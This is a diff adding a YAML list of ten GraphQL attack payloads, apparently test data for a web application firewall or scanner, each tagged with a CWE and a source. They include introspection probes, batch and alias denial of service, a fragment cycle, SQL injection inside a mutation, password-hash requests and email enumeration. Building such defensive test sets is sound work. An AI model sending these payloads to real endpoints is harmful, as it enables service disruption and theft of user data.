@@ -1,0 +1,72 @@
+# GraphQL injection / abuse — 10 entries. WAF-view only.
+# Sources: PayloadsAllTheThings/GraphQL, OWASP API Security Top 10, PortSwigger.
+
+- id: graphql-introspect
+  class: graphql
+  payload: '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-200
+  source: "OWASP API — introspection probe"
+
+- id: graphql-batch-dos
+  class: graphql
+  payload: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Batch-query amplification"
+
+- id: graphql-alias-dos
+  class: graphql
+  payload: '{"query":"{a:__typename b:__typename c:__typename d:__typename}"}'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Alias-based cost amplification"
+
+- id: graphql-mutation-inject
+  class: graphql
+  payload: '{"query":"mutation{createUser(name:\"x\\\")--\",role:\"admin\"){id}}"}'
+  trigger: *T200
+  cwe: CWE-89
+  source: "Nested SQLi inside GraphQL mutation"
+
+- id: graphql-fragment-cycle
+  class: graphql
+  payload: '{"query":"fragment f on Query{__typename ...f}"}'
+  trigger: *T200
+  cwe: CWE-674
+  source: "Fragment cycle — parser DoS"
+
+- id: graphql-field-suggest
+  class: graphql
+  payload: '{"query":"{ userr(id:1){id} }"}'                # typo elicits suggestions
+  trigger: *T200
+  cwe: CWE-200
+  source: "Schema leak via error suggestions"
+
+- id: graphql-introspect-typed
+  class: graphql
+  payload: '{"query":"query IntrospectionQuery{__schema{queryType{name} mutationType{name}}}"}'
+  trigger: *T200
+  cwe: CWE-200
+  source: "Typed introspection probe"
+
+- id: graphql-auth-bypass
+  class: graphql
+  payload: '{"query":"{user(id:1){email passwordHash}}"}'
+  trigger: *T200
+  cwe: CWE-284
+  source: "Broken access — direct password hash request"
+
+- id: graphql-directive-skip
+  class: graphql
+  payload: '{"query":"{user(id:1){id @skip(if:false) email @include(if:true)}}"}'
+  trigger: *T200
+  cwe: CWE-284
+  source: "Directive abuse for access bypass"
+
+- id: graphql-overloading
+  class: graphql
+  payload: '{"query":"{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email}}"}'
+  trigger: *T200
+  cwe: CWE-400
+  source: "Enumeration via alias overload"
